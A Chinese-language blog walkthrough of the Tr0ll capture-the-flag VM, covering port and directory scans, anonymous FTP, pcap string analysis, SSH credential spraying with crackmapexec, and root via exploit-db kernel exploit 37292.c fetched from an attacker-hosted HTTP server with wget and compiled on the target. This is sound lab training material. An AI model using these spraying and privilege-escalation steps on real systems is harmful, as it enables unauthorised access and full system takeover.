---
title: Tr0ll
date: 2024年6月28日
updated: 2024年6月28日
tags:
  - 靶场
categories: 靶场
keywords:
description: Tr0ll

---

Tr0ll

评价是相对而言比较简单的一个靶机


## 信息收集
```
┌──(kali㉿kali)-[~]
└─$ nmap -A  -p- 192.168.159.133
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-28 19:30 CST
Nmap scan report for 192.168.159.133
Host is up (0.0011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.159.129
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/secret
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:39:E9:62 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.14 ms 192.168.159.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.05 seconds

```
看到开放了80端口，进去瞅一眼

![](https://pic.imgdb.cn/item/667ea91fd9c307b7e9d0f402.png)

好xx的图

扫一下后台


```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u 192.168.159.133
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/_192.168.159.133/_24-06-28_19-29-19.txt

Target: http://192.168.159.133/

[19:29:19] Starting:
[19:29:22] 403 -  293B  - /.ht_wsr.txt
[19:29:22] 403 -  296B  - /.htaccess.bak1
[19:29:22] 403 -  296B  - /.htaccess.save
[19:29:22] 403 -  297B  - /.htaccess_extra
[19:29:22] 403 -  294B  - /.htaccessBAK
[19:29:22] 403 -  294B  - /.htaccessOLD
[19:29:22] 403 -  296B  - /.htaccess.orig
[19:29:22] 403 -  295B  - /.htaccessOLD2
[19:29:22] 403 -  298B  - /.htaccess.sample
[19:29:22] 403 -  286B  - /.htm
[19:29:22] 403 -  296B  - /.htaccess_orig
[19:29:22] 403 -  294B  - /.htaccess_sc
[19:29:22] 403 -  287B  - /.html
[19:29:22] 403 -  296B  - /.htpasswd_test
[19:29:22] 403 -  293B  - /.httr-oauth
[19:29:22] 403 -  292B  - /.htpasswds
[19:30:11] 200 -   31B  - /robots.txt
[19:30:12] 301 -  318B  - /secret  ->  http://192.168.159.133/secret/
[19:30:12] 200 -   37B  - /secret/
[19:30:13] 403 -  295B  - /server-status
[19:30:13] 403 -  296B  - /server-status/

Task Completed

```
看一下扫描出来的


![](https://pic.imgdb.cn/item/667ea96bd9c307b7e9d19263.png)

丑到我眼睛了

robots.txt里面经典没东西

回头看扫描发现有个ftp

## ftp隐匿登录

账号默认是FTP，密码空

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.159.133
Connected to 192.168.159.133.
220 (vsFTPd 3.0.2)
Name (192.168.159.133:kali): FTP
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||64665|).
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
226 Directory send OK.
ftp> binary
200 Switching to Binary mode.
ftp> get lol.pcap
local: lol.pcap remote: lol.pcap
229 Entering Extended Passive Mode (|||15984|).
150 Opening BINARY mode data connection for lol.pcap (8068 bytes).
100% |*************************************************|  8068      156.88 KiB/s    00:00 ETA
226 Transfer complete.
8068 bytes received in 00:00 (154.50 KiB/s)
ftp>
ftp> exit
221 Goodbye.
```
进去了，并且在里面发现一个lol.pcap

binary转换为二进制文件

get下来

在linux中查看问价的属性

```
┌──(kali㉿kali)-[~]
└─$ file lol.pcap
lol.pcap: pcapng capture file - version 1.0
```

正常是要用wireshark进行分析的

但是我们主要是利用这个文件的文本信息，所以可以

```
┌──(kali㉿kali)-[~]
└─$ strings lol.pcap
Linux 3.12-kali1-486
Dumpcap 1.10.2 (SVN Rev 51934 from /trunk-1.10)
eth0
host 10.0.0.6
Linux 3.12-kali1-486
220 (vsFTPd 3.0.2)
"USER anonymous
331 Please specify the password.
PASS password
230 Login successful.
SYST
215 UNIX Type: L8
PORT 10,0,0,12,173,198
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
226 Directory send OK.
TYPE I
W200 Switching to Binary mode.
PORT 10,0,0,12,202,172
g>      @
W200 PORT command successful. Consider using PASV.
RETR secret_stuff.txt
W150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
WWell, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
Sucks, you were so close... gotta TRY HARDER!
W226 Transfer complete.
TYPE A
O200 Switching to ASCII mode.
{PORT 10,0,0,12,172,74
O200 PORT command successful. Consider using PASV.
{LIST
O150 Here comes the directory listing.
O-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt
O226 Directory send OK.
{QUIT
221 Goodbye.
Counters provided by dumpcap
```

感觉跟直接用记事本打开差不多？

里面有一个secret_stuff.txt文件

大概意思是
```
WWell, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
```

好好好，你差点找到了sup3rs3cr3tdirlol :-P这个玩意

访问一下


里面有一个roflmao文件，搞下来分析一下

```

┌──(kali㉿kali)-[~/桌面]
└─$ file roflmao
roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped

┌──(kali㉿kali)-[~/桌面]
└─$ binwalk roflmao

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)


┌──(kali㉿kali)-[~/桌面]
└─$ strings roflmao
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
printf
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
Find address 0x0856BF to proceed
;*2$"
GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got
.got.plt
.data
.bss
.comment
crtstuff.c
__JCR_LIST__
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
completed.6590
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
roflmao.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
__x86.get_pc_thunk.bx
data_start
printf@@GLIBC_2.0
_edata
_fini
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_start_main@@GLIBC_2.0
__libc_csu_init
_end
_start
_fp_hw
__bss_start
main
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
_init

```
是一个ELF32位的可执行文件,并且里面没隐藏东西，而且还有告诉了一个地址0x0856BF

访问一下发现有两个文件夹

```good_luck/which_one_lol.txt```

以及

```this_folder_contains_the_password/Pass.txt```

一个是账号一个是密码，试试ssh

```
crackmapexec ssh 192.168.159.133 -u which_one_lol.txt -p Pass.txt --continue-on-success
```
--continue-on-success参数用于保证当寻找到首个账号与密码的对应关系后继续碰撞


一次只能尝试5个？应该是SSH那边有安全措施，还好就没几个，再试一次就好了

然后又寄了，然后想着这个靶机开始那么的，额，你懂的，然后就试试Pass.txt作为密码

man what can i say
```
┌──(kali㉿kali)-[~/桌面]
└─$ crackmapexec ssh 192.168.159.133 -u which_one_lol.txt -p 1.txt
SSH         192.168.159.133 22     192.168.159.133  [*] SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
SSH         192.168.159.133 22     192.168.159.133  [-] maleus:Pass.txt Authentication failed.
SSH         192.168.159.133 22     192.168.159.133  [-] ps-aux:Pass.txt Authentication failed.
SSH         192.168.159.133 22     192.168.159.133  [-] felux:Pass.txt Authentication failed.
SSH         192.168.159.133 22     192.168.159.133  [+] overflow:Pass.txt
```

ssh链接

id看身份

```
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
```

过了一会自己就给我退了，这不对吧老弟

应该是有什么清理任务的，，

找找

find / -name cronlog 2>/dev/null（后面这个是将错误信息扔掉，在搜索的时候，由于可能因为权限不被允许等原因，无法查找到结果，会有很多报错，因此添加2>/dev/null方便查看结果

cronlog是跟定时任务有关的日志

```
$ find / -name cronlog 2>/dev/null
/var/log/cronlog
$ python -c "import pty;pty.spawn('/bin/bash')"
overflow@troll:/$
overflow@troll:/$ cat /var/log/cronlog
*/2 * * * * cleaner.py
```

进去以后，好好好就你小子是吧

我试了试vim搞

但是文件是只读的，（所以我看的那个wp是怎么搞进去的，疑惑脸

name -u看一眼系统

linux 3.13.0


ok搜了一下37292.c和37293.c


经典
```
┌──(kali㉿kali)-[~/桌面]
└─$ searchsploit linux 3.13.0
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Alienvault Open Source SIEM (OSSIM) < 4.7.0 - 'get_license' | linux/remote/42697.rb
Alienvault Open Source SIEM (OSSIM) < 4.7.0 - av-centerd 'g | linux/remote/33805.pl
Alienvault Open Source SIEM (OSSIM) < 4.8.0 - 'get_file' In | linux/remote/42695.rb
AppArmor securityfs < 4.8 - 'aa_fs_seq_hash_show' Reference | linux/dos/40181.c
CyberArk < 10 - Memory Disclosure                           | linux/remote/44829.py
CyberArk Password Vault < 9.7 / < 10 - Memory Disclosure    | linux/dos/44428.txt
Dell EMC RecoverPoint < 5.1.2 - Local Root Command Executio | linux/local/44920.txt
Dell EMC RecoverPoint < 5.1.2 - Local Root Command Executio | linux/local/44920.txt
Dell EMC RecoverPoint < 5.1.2 - Remote Root Command Executi | linux/remote/44921.txt
Dell EMC RecoverPoint < 5.1.2 - Remote Root Command Executi | linux/remote/44921.txt
Dell EMC RecoverPoint boxmgmt CLI < 5.1.2 - Arbitrary File  | linux/local/44688.txt
DenyAll WAF < 6.3.0 - Remote Code Execution (Metasploit)    | linux/webapps/42769.rb
Exim < 4.86.2 - Local Privilege Escalation                  | linux/local/39549.txt
Exim < 4.90.1 - 'base64d' Remote Code Execution             | linux/remote/44571.py
Gnome Web (Epiphany) < 3.28.2.1 - Denial of Service         | linux/dos/44857.html
Jfrog Artifactory < 4.16 - Arbitrary File Upload / Remote C | linux/webapps/44543.txt
KDE libkhtml 3.5 < 4.2.0 - Unhandled HTML Parse Exception   | linux/dos/2954.html
LibreOffice < 6.0.1 - '=WEBSERVICE' Remote Arbitrary File D | linux/remote/44022.md
Linux < 4.14.103 / < 4.19.25 - Out-of-Bounds Read and Write | linux/dos/46477.txt
Linux < 4.16.9 / < 4.14.41 - 4-byte Infoleak via Uninitiali | linux/dos/44641.c
Linux < 4.20.14 - Virtual Address 0 is Mappable via Privile | linux/dos/46502.txt
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privil | solaris/local/15962.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Esca | linux/local/50135.c
Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFO | linux/local/41995.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) | linux/local/37293.txt
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo  | linux_x86-64/local/33516.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFI | linux_x86-64/local/31347.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' | linux/local/31346.c
Linux Kernel 3.4 < 3.13.2 - recvmmsg x32 compat (PoC)       | linux/dos/31305.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-A | linux/dos/43234.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation  | linux/local/41886.c
Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Esca | linux/local/34923.c
Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Pri | linux_x86-64/local/44302.c
Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local  | linux/dos/42136.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalatio | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Loca | linux/local/45553.c
Linux Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC)     | linux/dos/42762.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Pr | linux/local/45010.c
Linux Kernel < 4.14.rc3 - Local Denial of Service           | linux/dos/42932.c
Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak    | linux/local/44325.c
Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory C | linux/dos/44832.txt
Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free              | linux/dos/44579.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter tar | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux M | linux/local/47169.c
Linux Kernel < 4.5.1 - Off-By-One (PoC)                     | linux/dos/44301.c
Logpoint < 5.6.4 - Root Remote Code Execution               | linux/remote/42158.py
MatrixSSL < 4.0.2 - Stack Buffer Overflow Verifying x.509 C | linux/dos/46435.txt
MatrixSSL < 4.0.2 - Stack Buffer Overflow Verifying x.509 C | linux/dos/46435.txt
MiniDVBLinux <=5.4  - Config Download Exploit               | hardware/remote/51091.txt
Nagios < 4.2.2 - Arbitrary Code Execution                   | linux/remote/40920.py
Nagios < 4.2.4 - Local Privilege Escalation                 | linux/local/40921.sh
NfSen < 1.3.7 / AlienVault OSSIM < 5.3.6 - Local Privilege  | linux/local/42305.txt
OpenSSH 2.3 < 7.7 - Username Enumeration                    | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)              | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                      | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading    | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                        | linux/remote/45939.py
Oracle MySQL < 5.1.49 - 'DDL' Statements Denial of Service  | linux/dos/34522.txt
Oracle MySQL < 5.1.49 - Malformed 'BINLOG' Arguments Denial | linux/dos/34521.txt
Oracle VM VirtualBox < 5.0.32 / < 5.1.14 - Local Privilege  | linux/local/41196.txt
Oracle WebCenter FatWire Content Server < 7 - Improper Acce | linux/webapps/44757.txt
PHP < 4.4.5/5.2.1 - 'shmop' Local Code Execution            | linux/local/3426.php
PHP < 4.4.5/5.2.1 - 'shmop' SSL RSA Private-Key Disclosure  | linux/local/3427.php
PHP < 4.4.5/5.2.1 - '_SESSION unset()' Local Overflow       | linux/local/3571.php
PHP < 4.4.5/5.2.1 - '_SESSION' Deserialization Overwrite    | linux/local/3572.php
Pi-hole < 4.4 - Authenticated Remote Code Execution         | linux/webapps/48442.py
Pi-hole < 4.4 - Authenticated Remote Code Execution / Privi | linux/webapps/48443.py
Redis-cli < 5.0 - Buffer Overflow (PoC)                     | linux/local/44904.py
RPi Cam Control < 6.4.25 - 'preview.php' Remote Command Exe | linux/webapps/45361.py
runc < 1.0-rc6 (Docker < 18.09.2) - Container Breakout (1)  | linux/local/46359.md
runc < 1.0-rc6 (Docker < 18.09.2) - Container Breakout (2)  | linux/local/46369.md
Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' A | linux/remote/42084.rb
SAP B2B / B2C CRM 2.x < 4.x - Local File Inclusion          | linux/webapps/44655.txt
Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (1) | linux/local/47009.c
SixApart MovableType < 5.2.12 - Storable Perl Code Executio | linux/webapps/41697.rb
Splunk < 7.0.1 - Information Disclosure                     | linux/webapps/44865.txt
systemd (systemd-tmpfiles) < 236 - 'fs.protected_hardlinks= | linux/local/43935.txt
Tenable Appliance < 4.5 - Root Remote Code Execution        | linux/remote/41892.sh
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Nam | linux/local/41760.txt
UCOPIA Wireless Appliance < 5.1 (Captive Portal) - Root Rem | linux/remote/42949.txt
UCOPIA Wireless Appliance < 5.1.8 - Local Privilege Escalat | linux/local/42936.md
UCOPIA Wireless Appliance < 5.1.8 - Restricted Shell Escape | linux/local/42937.md
Vim < 8.1.1365 / Neovim < 0.3.6 - Arbitrary Code Execution  | linux/local/46973.md
Virtualmin < 3.703 - Multiple Local/Remote Vulnerabilities  | linux/remote/9143.txt
WordPress Core < 4.7.4 - Unauthorized Password Reset        | linux/webapps/41963.txt
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[~/桌面]
└─$

┌──(kali㉿kali)-[~/桌面]
└─$ cp /usr/share/exploitdb/exploits/linux/local/37292.c .

┌──(kali㉿kali)-[~/桌面]
└─$ ls
1.cer    40974.py                  get-pip.py  Pass.txt  vacation           zy.raw
1.txt    file.None.0x81c751a0.dat  LinEnum     reports   volatility3
37292.c  file.None.0x821231b8.dat  nuclei      roflmao   which_one_lol.txt

```
找，复制，看一气呵成，


在被攻击机那边进入tmp，不然你下不了东西，会一直报错权限不够，

攻击机起一个python服务器

```
py3
python -m http.server 5555

py2
python2 -m SimpleHTTPServer 5555

```

从另一边wget下载，编译成可执行文件

```
gcc 37292.c -o huanghong
```
运行，id
```
$ gcc 37292.c -o huanghong
$ ls
37292.c  huanghong
$ ./huanghong
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1002(overflow)
# ls
37292.c  huanghong
# cd /root
# ls
proof.txt
# cat proof.txt
Good job, you did it!


702a8c18d29c6f3ca0d99ef5712bfbdc

Broadcast Message from root@trol
        (somewhere) at 5:15 ...

TIMES UP LOL!

```

收工

~~所以我还是疑惑那哥们是怎么在没权限情况下搞定vim的~~